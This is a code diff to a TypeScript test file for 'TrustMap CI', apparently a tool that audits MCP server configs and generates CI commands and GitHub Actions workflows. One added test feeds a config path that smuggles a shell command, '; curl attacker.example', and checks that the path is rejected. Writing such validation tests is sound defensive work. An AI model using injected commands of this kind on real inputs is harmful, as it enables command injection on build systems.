@@ -1,5 +1,6 @@
 import assert from "node:assert/strict";
 import test from "node:test";
+import { parse as parseYaml } from "yaml";
 import type { McpServer } from "../lib/audit-engine.ts";
 import type { RiskException } from "../lib/finding-exceptions.ts";
 import {
@@ -8,6 +9,8 @@ import {
   createEnterprisePolicyPack,
   createEnterpriseSummary,
   createGithubActionsWorkflow,
+  createMultiEnvironmentWorkflow,
+  DEFAULT_TRUSTMAP_CI_PROFILES,
   evaluateCiGate,
   type TrustMapCiOptions,
 } from "../lib/trustmap-modules.ts";
@@ -82,13 +85,21 @@ const ciOptions: TrustMapCiOptions = {
 
 test("TrustMap CI génère une commande déterministe et sûre", () => {
   const command = createCiCommand(ciOptions);
-  assert.match(command, /--path "\.\/configs\/MCP production\.json"/);
+  assert.match(command, /--path '\.\/configs\/MCP production\.json'/);
   assert.match(command, /--fail-on high/);
   assert.match(command, /--require-servers/);
   assert.match(command, /--osv/);
   assert.match(command, /--provenance/);
   assert.match(command, /mcp-trustmap\.cdx\.json/);
   assert.match(command, /mcp-trustmap\.sarif/);
+  assert.throws(
+    () =>
+      createCiCommand({
+        ...ciOptions,
+        configPath: "./.mcp.json; curl attacker.example",
+      }),
+    /caractères non autorisés/,
+  );
 });
 
 test("TrustMap CI produit un workflow GitHub Actions avec SARIF", () => {
@@ -97,6 +108,30 @@ test("TrustMap CI produit un workflow GitHub Actions avec SARIF", () => {
   assert.match(workflow, /security-events: write/);
   assert.match(workflow, /github\/codeql-action\/upload-sarif@v4/);
   assert.match(workflow, /npm run collect/);
+});
+
+test("TrustMap CI génère des jobs indépendants par environnement", () => {
+  const workflow = createMultiEnvironmentWorkflow(
+    DEFAULT_TRUSTMAP_CI_PROFILES,
+  );
+
+  assert.match(workflow, /trustmap_development:/);
+  assert.match(workflow, /trustmap_staging:/);
+  assert.match(workflow, /trustmap_production:/);
+  assert.match(workflow, /environment: "production"/);
+  assert.match(workflow, /--fail-on critical/);
+  assert.match(workflow, /--fail-on high/);
+  assert.match(workflow, /--fail-on medium/);
+  assert.match(workflow, /mcp-trustmap-production\.sarif/);
+  assert.match(workflow, /category: "mcp-trustmap\/production"/);
+  assert.equal(
+    (workflow.match(/uses: actions\/checkout@v6/g) ?? []).length,
+    3,
+  );
+  const parsed = parseYaml(workflow) as {
+    jobs: Record<string, { environment: string }>;
+  };
+  assert.equal(parsed.jobs.trustmap_production.environment, "production");
 });
 
 test("TrustMap CI simule les constats ouverts et les exceptions actives", () => {
